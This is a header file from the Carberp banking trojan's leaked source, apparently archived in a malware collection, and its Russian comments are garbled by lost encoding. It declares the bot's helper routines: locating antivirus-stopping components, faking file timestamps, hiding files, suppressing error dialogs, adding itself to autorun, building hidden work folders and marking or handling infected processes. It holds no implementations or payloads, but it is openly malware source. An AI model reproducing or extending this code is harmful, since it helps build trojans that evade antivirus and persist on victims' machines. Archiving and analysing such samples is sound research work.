/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//-----------------------------------------------------------------------------
//  ������ ��������� ������ ����
//-----------------------------------------------------------------------------
#ifndef BotUtilsH
#define BotUtilsH
//-----------------------------------------------------------------------------


#include <windows.h>
#include "Strings.h"

DWORD SignalFirstRun( DWORD dwParam );


WCHAR *GetStopAVPath();
WCHAR *GetMiniAVPath();

WCHAR *GetTempName();


WCHAR *GetShellFoldersKey( DWORD dwParam );

void CopyFileToTemp( WCHAR *Path, WCHAR *Temp );

void SetFakeFileDateTime(PCHAR Path);
void SetFakeFileDateTimeW(PWCHAR Path);


//----------------------------------------------------------------------------
//  IsHideFile - ������� ���������� ������, ���� ���������� ��������
//               ��������� ����
//----------------------------------------------------------------------------
BOOL IsHide( DWORD dwFileHash );
BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint);

//----------------------------------------------------------------------------
// DisableShowFatalErrorDialog - ������� ������������� ����� �����������
//         ������ ��� ������� ������� �� ����� ���������� ��������� � �����
//         ��������. ��� ����� �� ������ ���� ���������� ����� ���������
//----------------------------------------------------------------------------
void DisableShowFatalErrorDialog();

void AddToAutoRun(void *body, DWORD size);
void AddToAutoRun(WCHAR *ModulePath);



namespace BOT
{
	//----------------------------------------------
	//  MakeBotPath - ������� ���������� ���� �
	//  ��������� �����, ��� ��� ����� ������� ����
	//  ������
	//----------------------------------------------
	string MakeBotPath();

	//----------------------------------------------
	//  MakeWorkPath ������� ������ ������� �����
	//               ���� � ���������� ���� � ���
	//  ����� ����� �������������� ����� �����
	//  ������� ������ ������� MakeBotPath()
	//----------------------------------------------
	string MakeWorkPath();

	//----------------------------------------------
	//  MakeWorkFolder - ������� ���������� ���
	//                   �������� �������� ����
	//----------------------------------------------
	PCHAR  MakeWorkFolder();


	//----------------------------------------------
	// MarkAsInfcted
	//
	// ������� ������� ������� ������ ���
	// ��������������
    //----------------------------------------------
	void MarkAsInfcted();

	//----------------------------------------------
	//  ProcessInfected
	//
	//  ������� ���������� ������ ���� ������� �
	//  ���������� ����� �����������
	//----------------------------------------------
	bool ProcessInfected(DWORD PID);

}



//-----------------------------------------------------------------------------
#endif
